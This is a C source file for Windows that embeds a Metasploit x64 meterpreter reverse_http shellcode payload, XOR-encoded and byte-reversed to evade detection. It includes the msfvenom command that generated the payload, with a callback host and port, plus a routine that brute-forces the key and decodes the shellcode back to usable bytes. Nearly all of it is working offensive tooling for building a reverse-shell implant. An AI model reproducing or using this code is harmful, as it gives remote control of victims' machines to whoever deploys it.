#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// compile: cl.exe /nologo /MT /Tcreverse_byte_order_xor.c /link /OUT:reverse_byte_order_xor.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

int bruteKey(int fbyte, int lbyte) {
        for (int xorkey = 0; xorkey < 255; xorkey++)
        {
                if ((lbyte ^ fbyte) == xorkey)
                { 
                        // found our xor key
                        return xorkey;
                }
        }
}

int main(void) {

	// msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f csharp | tr -d \\n
	// python3 reverse_byte_order_xor.py
	unsigned int reversed_payload[598] = {169, 131, 42, 222, 201, 140, 190, 187, 53, 37, 124, 22, 36, 191, 36, 174, 9, 188, 249, 191, 125, 52, 123, 247, 26, 206, 8, 188, 249, 92, 184, 255, 52, 169, 131, 124, 124, 124, 124, 158, 245, 234, 110, 198, 53, 133, 245, 53, 124, 124, 92, 124, 188, 187, 53, 166, 245, 52, 141, 245, 52, 155, 245, 52, 47, 47, 239, 52, 169, 131, 124, 124, 124, 124, 153, 47, 216, 36, 198, 53, 124, 124, 108, 124, 188, 187, 53, 108, 158, 189, 173, 245, 53, 38, 60, 22, 37, 47, 124, 124, 124, 41, 148, 176, 151, 126, 8, 179, 131, 52, 169, 131, 124, 124, 124, 124, 156, 73, 140, 56, 198, 53, 124, 124, 111, 244, 189, 187, 52, 99, 9, 188, 249, 169, 131, 7, 100, 122, 81, 190, 187, 53, 47, 47, 181, 77, 49, 181, 77, 49, 141, 245, 52, 38, 47, 35, 118, 22, 186, 245, 52, 169, 131, 71, 82, 41, 151, 190, 187, 53, 47, 47, 44, 124, 124, 124, 124, 248, 84, 126, 124, 196, 52, 47, 181, 77, 49, 36, 61, 38, 47, 189, 245, 52, 124, 43, 18, 41, 43, 46, 55, 74, 36, 48, 54, 10, 74, 52, 8, 68, 36, 63, 24, 23, 61, 74, 9, 62, 31, 55, 79, 56, 23, 16, 20, 22, 20, 15, 6, 50, 14, 11, 36, 36, 15, 42, 55, 49, 74, 12, 63, 47, 21, 23, 14, 10, 22, 10, 61, 29, 27, 74, 24, 61, 16, 41, 78, 54, 23, 54, 18, 13, 74, 22, 24, 24, 10, 57, 25, 14, 83, 124, 124, 124, 49, 148, 169, 131, 124, 124, 124, 124, 186, 227, 245, 43, 198, 53, 47, 127, 22, 47, 47, 181, 77, 49, 124, 124, 124, 44, 188, 187, 53, 189, 245, 52, 38, 124, 72, 79, 77, 82, 76, 69, 77, 82, 68, 74, 77, 82, 78, 69, 77, 124, 124, 124, 108, 148, 169, 131, 124, 124, 124, 124, 219, 5, 42, 70, 198, 53, 47, 47, 181, 77, 49, 188, 77, 49, 38, 47, 157, 245, 52, 47, 47, 169, 131, 123, 90, 11, 48, 190, 187, 53, 157, 245, 52, 42, 61, 124, 8, 25, 18, 21, 18, 21, 11, 194, 53, 47, 167, 77, 52, 33, 131, 131, 131, 55, 149, 110, 247, 52, 38, 37, 61, 36, 156, 131, 46, 61, 92, 144, 255, 52, 38, 61, 37, 61, 36, 61, 38, 37, 172, 125, 52, 34, 36, 61, 36, 61, 244, 120, 247, 61, 172, 125, 53, 96, 60, 247, 56, 52, 112, 247, 61, 26, 172, 125, 53, 88, 60, 247, 56, 36, 164, 9, 173, 69, 57, 116, 88, 48, 127, 48, 141, 9, 156, 68, 189, 125, 61, 113, 181, 189, 61, 208, 188, 77, 52, 170, 125, 52, 244, 72, 247, 61, 181, 131, 52, 181, 77, 49, 42, 159, 172, 125, 53, 92, 60, 247, 56, 100, 52, 247, 44, 172, 125, 52, 27, 8, 188, 249, 52, 124, 124, 124, 244, 252, 247, 124, 124, 124, 14, 249, 115, 126, 119, 100, 4, 253, 26, 172, 125, 52, 64, 62, 247, 45, 61, 92, 46, 247, 52, 46, 145, 158, 189, 125, 61, 113, 181, 189, 61, 92, 80, 126, 0, 29, 64, 208, 188, 77, 52, 181, 77, 49, 44, 14, 247, 52, 54, 54, 203, 115, 52, 92, 46, 247, 52, 100, 46, 247, 52, 28, 46, 247, 52, 25, 42, 174, 77, 52, 45, 46, 44, 61, 45, 61, 124, 124, 124, 176, 148, 140, 152, 255, 52, 128};
	int firstbyte = 252;
    char shellcode[598] = { 0 };

    int lbyte = reversed_payload[(sizeof(reversed_payload) / sizeof(reversed_payload[0])) - 1];
    int xorkey = bruteKey(firstbyte, lbyte);
	
    // reverse and de-xor our array of ints
    for (int i = 0; i < 598; i++)
    {
            char decoded = reversed_payload[598 - i - 1] ^ xorkey;
            shellcode[i] = decoded;
    }

	int idx = 0;
	while ( idx < sizeof(shellcode))
	{
		if (idx == (sizeof(shellcode) - 1) )
		{
			printf("0x%02x ", (unsigned char)shellcode[idx]);
		}
		else
		{
			printf("0x%02x, ", (unsigned char)shellcode[idx]);
		}
		idx++;
	}

    return 0;
}

